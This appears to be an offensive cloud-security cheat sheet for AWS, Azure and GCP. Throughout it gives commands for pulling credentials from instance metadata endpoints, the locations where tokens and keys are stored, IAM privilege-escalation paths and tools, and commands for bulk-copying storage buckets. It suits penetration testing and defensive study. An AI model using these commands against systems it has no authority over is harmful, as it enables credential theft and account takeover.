---
name: cloud
description: AWS/Azure/GCP — metadata, IAM privesc, storage, keys.
tags: [aws, azure, gcp, imds, iam]
---
# Cloud

## AWS
- IMDSv1: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- IMDSv2: `TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 60" http://169.254.169.254/latest/api/token)` then `-H "X-aws-ec2-metadata-token: $TOKEN"`.
- Env: `AWS_ACCESS_KEY_ID`, `~/.aws/credentials`, ECS `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`.
- Who am I: `aws sts get-caller-identity`; `aws iam list-attached-user-policies`.
- Privesc: `enumerate-iam`, `Pacu`, `cloudsplaining`; classics `iam:CreatePolicyVersion`, `iam:PassRole`+`ec2:RunInstances`, `lambda:UpdateFunctionCode`, `sts:AssumeRole`.
- S3: `aws s3 ls`, `aws s3 cp s3://bucket/ . --recursive`; anonymous `curl https://bucket.s3.amazonaws.com/?list-type=2`.
- Secrets: `aws ssm get-parameters-by-path --with-decryption`, Secrets Manager, Lambda env vars.

## Azure
- IMDS: `curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"`
- Token: `curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"`
- `az login --identity`, `az account list`, `az role assignment list --all`.
- Privesc: Owner / User Access Administrator, managed identity on VM or function.
- Storage: `az storage container list --account-name $SA --auth-mode login`.

## GCP
- `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
- `gcloud auth activate-service-account --key-file=sa.json`; `gcloud projects list`.
- Privesc: `iam.serviceAccounts.actAs` + `compute.instances.create`, `setIamPolicy` on project.
- Storage: `gsutil ls`, `gsutil cp gs://bucket/* .`.

## Hidden knowledge
- IMDS is reachable from SSRF; try both `169.254.169.254` and `fd00:ec2::254` (IPv6).
- `~/.aws/cli/cache`, `~/.azure/`, `~/.config/gcloud/` persist tokens after logout.
- S3 bucket names leak in JS, DNS CNAMEs, and error pages.
- `aws iam get-account-authorization-details` shows who can `iam:*`.
- Cloud creds often live in CI: `.gitlab-ci.yml`, GitHub Actions secrets, `docker inspect` env.
